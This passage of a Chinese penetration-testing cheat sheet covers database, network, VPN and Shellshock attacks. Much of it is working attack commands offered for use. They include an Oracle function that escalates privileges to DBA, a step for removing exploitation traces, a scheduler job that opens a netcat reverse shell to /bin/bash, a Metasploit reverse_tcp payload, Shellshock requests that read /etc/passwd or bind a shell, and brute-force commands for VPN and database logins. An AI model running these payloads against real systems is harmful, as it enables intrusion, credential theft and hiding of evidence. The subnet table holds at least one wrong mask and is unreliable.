href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>在Kali Rolling上安装OpenVAS 8 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get dist-upgrade -y</span><br><span class="line">apt-get install openvas</span><br><span class="line">openvas-setup</span><br></pre></td></tr></table></figure><p>确认openvas  正在运行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tulpn</span><br></pre></td></tr></table></figure><p>通过<code>https://127.0.0.1:9392</code> 登陆openvas，密码是在安装时设置好的。</p><h2 id="数据库渗透测试"><a href="#数据库渗透测试" class="headerlink" title="数据库渗透测试"></a>数据库渗透测试</h2><p>攻击暴露在互联网上的数据库。</p><h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><p>安装 oscanner：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install oscanner</span><br></pre></td></tr></table></figure><p>运行 oscanner：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oscanner -s 192.168.1.200 -P 1521</span><br></pre></td></tr></table></figure><h4 id="Oracle-TNS版本指纹识别"><a href="#Oracle-TNS版本指纹识别" class="headerlink" title="Oracle TNS版本指纹识别"></a>Oracle TNS版本指纹识别</h4><p>安装 tnscmd10g ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install tnscmd10g</span><br></pre></td></tr></table></figure><p>识别：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tnscmd10g version -h TARGET</span><br><span class="line">nmap --script=oracle-tns-version</span><br></pre></td></tr></table></figure><h4 id="爆破Oracle账户"><a href="#爆破Oracle账户" class="headerlink" title="爆破Oracle账户"></a>爆破Oracle账户</h4><p>验证默认账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>对Oracle TNS 运行nmap脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1521 -A TARGET</span><br></pre></td></tr></table></figure><h4 id="Oracle权限提升"><a href="#Oracle权限提升" class="headerlink" title="Oracle权限提升"></a>Oracle权限提升</h4><p>利用条件：</p><ul><li>Oracle必须暴露在互联网上</li><li>使用默认账户，如scott</li></ul><p>简明流程：</p><ul><li>创建函数</li><li>创建表 SYS.DUAL  的索引</li><li>刚刚建立的索引执行了SCOTT.DBA_X 函数</li><li>函数是被SYS用户执行的，因为表 SYS.DUAL 属于SYS用户</li><li>创建具有DBA权限的账户</li></ul><p>下面的展示使用SCOTT用户，但其他默认的Oracle用户也是可以的。</p><h5 id="使用NMAP-NSE脚本验证oracle数据库中的默认账户："><a href="#使用NMAP-NSE脚本验证oracle数据库中的默认账户：" class="headerlink" title="使用NMAP NSE脚本验证oracle数据库中的默认账户："></a>使用NMAP NSE脚本验证oracle数据库中的默认账户：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=oracle-sid-brute </span><br><span class="line">nmap --script=oracle-brute</span><br></pre></td></tr></table></figure><p>使用脆弱账号登陆（假设你发现了一个）。</p><h5 id="确认一个oracle用户的权限级别"><a href="#确认一个oracle用户的权限级别" class="headerlink" title="确认一个oracle用户的权限级别"></a>确认一个oracle用户的权限级别</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; select * from session_privs; </span><br><span class="line"></span><br><span class="line">SQL&gt; CREATE OR REPLACE FUNCTION GETDBA(FOO varchar) return varchar deterministic authid </span><br><span class="line">curren_user is </span><br><span class="line">pragma autonomous_transaction; </span><br><span class="line">begin </span><br><span class="line">execute immediate &apos;grant dba to user1 identified by pass1&apos;;</span><br><span class="line">commit;</span><br><span class="line">return &apos;FOO&apos;;</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h5 id="Oracle权限提升和访问DBA"><a href="#Oracle权限提升和访问DBA" class="headerlink" title="Oracle权限提升和访问DBA"></a>Oracle权限提升和访问DBA</h5><p>运行netcat，<code>netcat -nvlp 443</code> 。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</span><br></pre></td></tr></table></figure><h5 id="运行查询语句"><a href="#运行查询语句" class="headerlink" title="运行查询语句"></a>运行查询语句</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; Select * from session_privs;</span><br></pre></td></tr></table></figure><p>这时你应该拥有一个DBA用户，可以重新运行上面的命令来验证自己是否拥有DBA特权。</p><h5 id="移除利用痕迹："><a href="#移除利用痕迹：" class="headerlink" title="移除利用痕迹："></a>移除利用痕迹：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop index exploit_1337;</span><br></pre></td></tr></table></figure><h5 id="获取Oracle反弹shell："><a href="#获取Oracle反弹shell：" class="headerlink" title="获取Oracle反弹shell："></a>获取Oracle反弹shell：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">begin</span><br><span class="line">dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;</span><br><span class="line">    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;</span><br><span class="line">    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); </span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);</span><br><span class="line">dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);</span><br><span class="line">dbms_scheduler.enable(&apos;rev_shell&apos;); </span><br><span class="line">end;</span><br></pre></td></tr></table></figure><h3 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h3><p>枚举/发现</p><p>Nmap</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156</span><br></pre></td></tr></table></figure><p>Metasploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/scanner/mssql/mssql_ping</span><br></pre></td></tr></table></figure><h4 id="爆破-MSSQL登陆"><a href="#爆破-MSSQL登陆" class="headerlink" title="爆破 MSSQL登陆"></a>爆破 MSSQL登陆</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_enum</span><br></pre></td></tr></table></figure><h4 id="Metasploit-MSSQL-Shell"><a href="#Metasploit-MSSQL-Shell" class="headerlink" title="Metasploit MSSQL Shell"></a>Metasploit MSSQL Shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/mssql/mssql_payload</span><br><span class="line">msf exploit(mssql_payload) &gt; set PAYLOAD windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><h3 id="Plink-exe-隧道"><a href="#Plink-exe-隧道" class="headerlink" title="Plink.exe 隧道"></a>Plink.exe 隧道</h3><p>PuTTY Link  隧道</p><p>转发运程端口到本地地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plink.exe -P 22 -l root -pw &quot;1337&quot; -R 445:127.0.0.1:445 REMOTE-IP</span><br></pre></td></tr></table></figure><h3 id="跳板（Pivoting）"><a href="#跳板（Pivoting）" class="headerlink" title="跳板（Pivoting）"></a>跳板（Pivoting）</h3><h4 id="SSH-跳板（ssh-Pivoting）"><a href="#SSH-跳板（ssh-Pivoting）" class="headerlink" title="SSH 跳板（ssh Pivoting）"></a>SSH 跳板（ssh Pivoting）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip</span><br></pre></td></tr></table></figure><p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p><p>利用SSH跳板跨越网络</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1</span><br></pre></td></tr></table></figure><p>需在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1010</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2</span><br></pre></td></tr></table></figure><p>在<code>/etc/proxychains.conf</code> 添加sock4  <code>127.0.0.1 1011</code></p><h4 id="Meterpreter-Pivoting"><a href="#Meterpreter-Pivoting" class="headerlink" title="Meterpreter Pivoting"></a>Meterpreter Pivoting</h4><h3 id="TTL-指纹识别"><a href="#TTL-指纹识别" class="headerlink" title="TTL 指纹识别"></a>TTL 指纹识别</h3><table><thead><tr><th>操作系统</th><th>TTL 值</th></tr></thead><tbody><tr><td>Windows</td><td><code>128</code></td></tr><tr><td>Linux</td><td><code>64</code></td></tr><tr><td>Solaris</td><td><code>255</code></td></tr><tr><td>Cisco / Network</td><td><code>255</code></td></tr></tbody></table><h3 id="IPv4-速查"><a href="#IPv4-速查" class="headerlink" title="IPv4 速查"></a>IPv4 速查</h3><h4 id="各类IP的地址范围"><a href="#各类IP的地址范围" class="headerlink" title="各类IP的地址范围"></a>各类IP的地址范围</h4><table><thead><tr><th>类别</th><th>IP 地址范围</th></tr></thead><tbody><tr><td>A类</td><td><code>0.0.0.0 - 127.255.255.255</code></td></tr><tr><td>B类</td><td><code>128.0.0.0 - 191.255.255.255</code></td></tr><tr><td>C类</td><td><code>192.0.0.0 - 223.255.255.255</code></td></tr><tr><td>D类</td><td><code>224.0.0.0 - 239.255.255.255</code></td></tr><tr><td>E类</td><td><code>240.0.0.0 - 255.255.255.255</code></td></tr></tbody></table><h4 id="IPv4私有地址"><a href="#IPv4私有地址" class="headerlink" title="IPv4私有地址"></a>IPv4私有地址</h4><table><thead><tr><th>类别</th><th>范围</th></tr></thead><tbody><tr><td>A类私有地址</td><td><code>10.0.0.0 - 10.255.255.255</code></td></tr><tr><td>B类私有地址</td><td><code>172.16.0.0 - 172.31.255.255</code></td></tr><tr><td>C类私有地址</td><td><code>192.168.0.0 - 192.168.255.255</code></td></tr><tr><td></td><td><code>127.0.0.0 - 127.255.255.255</code></td></tr></tbody></table><h4 id="IPv4子网速查表"><a href="#IPv4子网速查表" class="headerlink" title="IPv4子网速查表"></a>IPv4子网速查表</h4><p>和渗透测试关系不太大，但确实很有用。</p><table><thead><tr><th>CIDR</th><th>十进制掩码</th><th>主机数量</th></tr></thead><tbody><tr><td>/31</td><td><code>255.255.255.254</code></td><td><code>1 Host</code></td></tr><tr><td>/30</td><td><code>255.255.255.252</code></td><td><code>2 Hosts</code></td></tr><tr><td>/29</td><td><code>255.255.255.249</code></td><td><code>6 Hosts</code></td></tr><tr><td>/28</td><td><code>255.255.255.240</code></td><td><code>14 Hosts</code></td></tr><tr><td>/27</td><td><code>255.255.255.224</code></td><td><code>30 Hosts</code></td></tr><tr><td>/26</td><td><code>255.255.255.192</code></td><td><code>62 Hosts</code></td></tr><tr><td>/25</td><td><code>255.255.255.128</code></td><td><code>126 Hosts</code></td></tr><tr><td>/24</td><td><code>255.255.255.0</code></td><td><code>254 Hosts</code></td></tr><tr><td>/23</td><td><code>255.255.254.0</code></td><td><code>512 Host</code></td></tr><tr><td>/22</td><td><code>255.255.252.0</code></td><td><code>1022 Hosts</code></td></tr><tr><td>/21</td><td><code>255.255.248.0</code></td><td><code>2046 Hosts</code></td></tr><tr><td>/20</td><td><code>255.255.240.0</code></td><td><code>4094 Hosts</code></td></tr><tr><td>/19</td><td><code>255.255.224.0</code></td><td><code>8190 Hosts</code></td></tr><tr><td>/18</td><td><code>255.255.192.0</code></td><td><code>16382 Hosts</code></td></tr><tr><td>/17</td><td><code>255.255.128.0</code></td><td><code>32766 Hosts</code></td></tr><tr><td>/16</td><td><code>255.255.0.0</code></td><td><code>65534 Hosts</code></td></tr><tr><td>/15</td><td><code>255.254.0.0</code></td><td><code>131070 Hosts</code></td></tr><tr><td>/14</td><td><code>255.252.0.0</code></td><td><code>262142 Hosts</code></td></tr><tr><td>/13</td><td><code>255.248.0.0</code></td><td><code>524286 Hosts</code></td></tr><tr><td>/12</td><td><code>255.240.0.0</code></td><td><code>1048674 Hosts</code></td></tr><tr><td>/11</td><td><code>255.224.0.0</code></td><td><code>2097150 Hosts</code></td></tr><tr><td>/10</td><td><code>255.192.0.0</code></td><td><code>4194302 Hosts</code></td></tr><tr><td>/9</td><td><code>255.128.0.0</code></td><td><code>8388606 Hosts</code></td></tr><tr><td>/8</td><td><code>255.0.0.0</code></td><td><code>16777214 Hosts</code></td></tr></tbody></table><h3 id="VLAN-hopping（跳跃攻击）"><a href="#VLAN-hopping（跳跃攻击）" class="headerlink" title="VLAN hopping（跳跃攻击）"></a>VLAN hopping（跳跃攻击）</h3><p>使用nccgroup 的脚本简化攻击过程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/vlan-hopping.git</span><br><span class="line">chmod 700 frogger.sh</span><br><span class="line">./frogger.sh</span><br></pre></td></tr></table></figure><h3 id="VPN测试工具"><a href="#VPN测试工具" class="headerlink" title="VPN测试工具"></a>VPN测试工具</h3><p>识别VPN服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike TARGET(s)</span><br></pre></td></tr></table></figure><p>扫描VPN服务器网段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike -f ip.txt</span><br></pre></td></tr></table></figure><h4 id="IKEForce"><a href="#IKEForce" class="headerlink" title="IKEForce"></a>IKEForce</h4><p>使用IKEForce枚举或对 VPN 服务器进行字典攻击.</p><p>安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install pyip</span><br><span class="line">git clone https://github.com/SpiderLabs/ikeforce.git</span><br></pre></td></tr></table></figure><p>使用IKEForce对IKE VPN 进行枚举：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><p>使用 IKEForce 爆破 IKE VPN:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ike-scan</span><br><span class="line">ike-scan TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP</span><br><span class="line">ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="IKE-激进模式-PSK-破解"><a href="#IKE-激进模式-PSK-破解" class="headerlink" title="IKE 激进模式 PSK 破解"></a>IKE 激进模式 PSK 破解</h4><ol><li>验证VPN服务器</li><li>使用 IKEForce 枚举来获得组ID</li><li>使用 ike-scan 从IKE 终端抓取 PSK 哈希 </li><li>使用 psk-crack 破解哈希</li></ol><h5 id="Step-1-验证IKE服务器"><a href="#Step-1-验证IKE服务器" class="headerlink" title="Step 1: 验证IKE服务器"></a>Step 1: 验证IKE服务器</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./udp-protocol-scanner.pl -p ike SUBNET/24</span><br></pre></td></tr></table></figure><h5 id="Step-2-使用IKEForce枚举组名"><a href="#Step-2-使用IKEForce枚举组名" class="headerlink" title="Step 2:使用IKEForce枚举组名"></a>Step 2:使用IKEForce枚举组名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic</span><br></pre></td></tr></table></figure><h5 id="Step-3-使用ike-scan抓取PSK哈希"><a href="#Step-3-使用ike-scan抓取PSK哈希" class="headerlink" title="Step 3: 使用ike-scan抓取PSK哈希"></a>Step 3: 使用ike-scan抓取PSK哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP</span><br></pre></td></tr></table></figure><h5 id="Step-4-使用psk-crack-破解PSK-哈希"><a href="#Step-4-使用psk-crack-破解PSK-哈希" class="headerlink" title="Step 4: 使用psk-crack 破解PSK 哈希"></a>Step 4: 使用psk-crack 破解PSK 哈希</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psk-crack hash-file.txt</span><br></pre></td></tr></table></figure><p>高级psk-crack 选项:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pskcrack</span><br><span class="line">psk-crack -b 5 TARGET-IPkey</span><br><span class="line">psk-crack -b 5 --charset=&quot;01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; 192-168-207-134key</span><br><span class="line">psk-crack -d /path/to/dictionary-file TARGET-IP-key</span><br></pre></td></tr></table></figure><h4 id="PPTP-Hacking"><a href="#PPTP-Hacking" class="headerlink" title="PPTP Hacking"></a>PPTP Hacking</h4><p>验证PPTP服务 ，它以TCP协议在1723端口监听</p><h5 id="NMAP-PPTP-指纹识别"><a href="#NMAP-PPTP-指纹识别" class="headerlink" title="NMAP PPTP 指纹识别:"></a>NMAP PPTP 指纹识别:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap –Pn -sV -p 1723 TARGET(S)</span><br></pre></td></tr></table></figure><h5 id="PPTP字典攻击"><a href="#PPTP字典攻击" class="headerlink" title="PPTP字典攻击"></a>PPTP字典攻击</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst</span><br></pre></td></tr></table></figure><h3 id="DNS-隧道"><a href="#DNS-隧道" class="headerlink" title="DNS 隧道"></a>DNS 隧道</h3><p>通过DNS传送数据来绕过防火墙。dns2cat支持和目标主机间 的上传和下载文件（数据或程序）操作。</p><h4 id="攻击机器："><a href="#攻击机器：" class="headerlink" title="攻击机器："></a>攻击机器：</h4><p>安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get -y install ruby-dev git make g++</span><br><span class="line">gem install bundler</span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">cd dnscat2/server</span><br><span class="line">bundle install</span><br></pre></td></tr></table></figure><p>运行dnscat2:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 1422</span><br><span class="line">dnscat2&gt; session -i 1422</span><br></pre></td></tr></table></figure><p>目标机器:</p><p><a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a> </p><p><a href="https://github.com/lukebaggett/dnscat2-powershell/" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure><h2 id="BOF-Exploit"><a href="#BOF-Exploit" class="headerlink" title="BOF / Exploit"></a>BOF / Exploit</h2><h2 id="Exploit-搜索"><a href="#Exploit-搜索" class="headerlink" title="Exploit 搜索"></a>Exploit 搜索</h2><p>寻找枚举主机/服务的exp</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td>`searchsploit windows 2003</td><td>grep -i local`</td><td>从 exploit-db搜索EXP, 这里以WIndows2003本地提权为例</td></tr><tr><td><code>site:exploit-db.com exploit kernel &lt;= 3</code></td><td>使用Google搜索exploit-db.com</td></tr><tr><td><code>grep -R &quot;W7&quot; /usr/share/metasploit-framework/modules/exploit/windows/*</code></td><td>用grep搜索metasploit的模块——因为msf的搜索有点差劲。</td></tr></tbody></table><h3 id="搜索EXP"><a href="#搜索EXP" class="headerlink" title="搜索EXP"></a>搜索EXP</h3><p>安装exploit-db的本地备份:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">searchsploit –u</span><br><span class="line">searchsploit apache 2.2</span><br><span class="line">searchsploit &quot;Linux Kernel&quot;</span><br><span class="line">searchsploit linux 2.6 | grep -i ubuntu | grep local</span><br></pre></td></tr></table></figure><h3 id="在Kali上编译WIndows的exp"><a href="#在Kali上编译WIndows的exp" class="headerlink" title="在Kali上编译WIndows的exp"></a>在Kali上编译WIndows的exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download</span><br><span class="line">wine mingw-get-setup.exe</span><br><span class="line">select mingw32-base</span><br><span class="line">cd /root/.wine/drive_c/windows</span><br><span class="line">wget http://gojhonny.com/misc/mingw_bin.zip &amp;&amp; unzip mingw_bin.zip</span><br><span class="line">cd /root/.wine/drive_c/MinGW/bin</span><br><span class="line">wine gcc -o ability.exe /tmp/exploit.c -lwsock32</span><br><span class="line">wine ability.exe</span><br></pre></td></tr></table></figure><h3 id="交叉编译Exploits"><a href="#交叉编译Exploits" class="headerlink" title="交叉编译Exploits"></a>交叉编译Exploits</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -o output32 hello.c (32 bit)</span><br><span class="line">gcc -m64 -o output hello.c (64 bit)</span><br></pre></td></tr></table></figure><h3 id="利用通用漏洞"><a href="#利用通用漏洞" class="headerlink" title="利用通用漏洞"></a>利用通用漏洞</h3><h4 id="利用Shellshock漏洞"><a href="#利用Shellshock漏洞" class="headerlink" title="利用Shellshock漏洞"></a>利用Shellshock漏洞</h4><p>一个用来寻找和利用Shellshock漏洞的攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/nccgroup/shocker</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./shocker.py -H TARGET  --command &quot;/bin/cat /etc/passwd&quot; -c /cgi-bin/status --verbose</span><br></pre></td></tr></table></figure><h5 id="cat-file-查看文件内容"><a href="#cat-file-查看文件内容" class="headerlink" title="cat file (查看文件内容)"></a>cat file (查看文件内容)</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-运行bind-shell"><a href="#Shell-Shock-运行bind-shell" class="headerlink" title="Shell Shock 运行bind shell"></a>Shell Shock 运行bind shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc TARGET 80</span><br></pre></td></tr></table></figure><h5 id="Shell-Shock-反弹shell"><a href="#Shell-Shock-反弹shell" class="headerlink" title="Shell Shock 反弹shell"></a>Shell Shock 反弹shell</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 443</span><br></pre></td></tr></table></figure><h2 id="简单的本地Web服务器"><a href="#简单的本地Web服务器" class="headerlink" title="简单的本地Web服务器"></a>简单的本地Web服务器</h2><p>使用Python命令运行本地Web服务，在接受反向shell和攻击目标机器是很方便。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>python -m SimpleHTTPServer 80</code></td><td>运行一个基本的 http 服务,接受反弹shell等情况下很棒</td></tr><tr><td><code>python3 -m http.server</code></td><td>运行一个基本的 Python3 http 服务</td></tr><tr><td><code>ruby -rwebrick -e &quot;WEBrick::HTTPServer.new(:Port =&gt; 80, :DocumentRoot =&gt; Dir.pwd).start&quot;</code></td><td>运行一个基本的ruby http 服务</td></tr><tr><td><code>php -S 0.0.0.0:80</code></td><td>运行一个基本的 PHP http 服务</td></tr></tbody></table><h2 id="挂载文件共享"><a href="#挂载文件共享" class="headerlink" title="挂载文件共享"></a>挂载文件共享</h2><p>怎样挂载 NFS / CIFS以进行 Windows 和Linux 的文件共享。</p><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>mount 192.168.1.1:/vol/share /mnt/nfs</code></td><td>挂载NFS共享到 <code>/mnt/nfs</code></td></tr><tr><td><code>mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs</code></td><td>挂载Windows CIFS / SMB 共享到 Linux 的 <code>/mnt/cifs</code> 。如果不直接在命令里带密码，可以在询问后输入，这样就不会在bash命令历史里存储明文密码</td></tr><tr><td><code>net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no</code></td><td>使用命令行在Windows间挂载共享文件</td></tr><tr><td><code>apt-get install smb4k -y</code></td><td>在Kali上安装smb4k，方便从Linux的GUI查看SMB共享</td></tr></tbody></table><h2 id="HTTP-HTTPS-Web服务枚举"><a href="#HTTP-HTTPS-Web服务枚举" class="headerlink" title="HTTP / HTTPS Web服务枚举"></a>HTTP / HTTPS Web服务枚举</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>nikto -h 192.168.1.1</code></td><td>对目标使用 nikto 进行扫描</td></tr><tr><td><code>dirbuster</code></td><td>使用GUI配置，命令行不好使</td></tr></tbody></table><h2 id="数据包侦测"><a href="#数据包侦测" class="headerlink" title="数据包侦测"></a>数据包侦测</h2><table><thead><tr><th>命令</th><th>解释</th></tr></thead><tbody><tr><td><code>tcpdump tcp port 80 -w output.pcap -i eth0</code></td><td>将网卡eth0的80端口的流量导出到output.pcap</td></tr></tbody></table><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" 